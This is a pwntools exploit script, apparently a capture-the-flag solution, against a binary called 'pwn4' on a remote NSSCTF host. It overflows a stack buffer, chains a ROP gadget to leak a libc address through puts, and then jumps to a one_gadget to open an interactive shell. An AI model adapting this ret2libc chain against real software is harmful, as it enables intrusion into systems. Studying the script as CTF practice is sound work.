from threading import main_thread
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
libc = ELF('./libc-2.31.so')
elf = ELF('./pwn4')

context.log_level = 'debug'
debug = 0

if debug:
    io = process('./pwn4')
else:
    io = remote('node5.anna.nssctf.cn',28081)

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget = [0xe3afe,0xe3b01,0xe3b04]

pop_rdi = 0x00000000004007d3 # pop rdi ; ret
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x4006B0
success("puts_got -->" +hex(puts_got))
success("puts_plt -->" +hex(puts_plt))
payload = b'\x00'*0x68 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
#p()
io.sendafter(b"Leave your message:",payload)
libc_base = u64(io.recvuntil(b'\x7f')[-6:] + b'\x00\x00') -0x84420
success("libc_base -->" + hex(libc_base))
#p()
payload = b'\x00' * 0x68 + p64(libc_base + one_gadget[1])
io.sendafter(b"Leave your message:",payload)


io.interactive()

